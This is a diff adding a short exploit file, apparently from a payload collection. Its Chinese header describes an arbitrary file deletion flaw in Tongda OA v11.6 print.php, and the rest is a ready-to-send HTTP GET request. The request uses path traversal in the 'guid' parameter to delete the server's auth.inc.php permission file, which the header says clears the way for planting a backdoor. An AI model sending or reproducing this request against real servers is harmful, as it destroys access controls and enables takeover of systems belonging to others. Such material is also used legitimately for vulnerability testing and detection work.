@@ -1,0 +1,9 @@
+# 通达OA v11.6 print.php 任意文件删除漏洞
+# 通达OA v11.6 print.php存在任意文件删除漏洞，攻击者通过此漏洞可以删除权限校验文件，进一步写入恶意文件后门控制服务器。
+GET /module/appbuilder/assets/print.php?acid=80025419&guid=..%2F..%2F..%2Fwebroot%2Finc%2Fauth.inc.php&bid=hd_tag_m8mv2607 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2607
+RM-PRO-Token: f32b4b533f961d72fbbdd346f968b3db
+RM-PRO-Time: 1742808518765
+User-Agent: curl/7.83.1
+
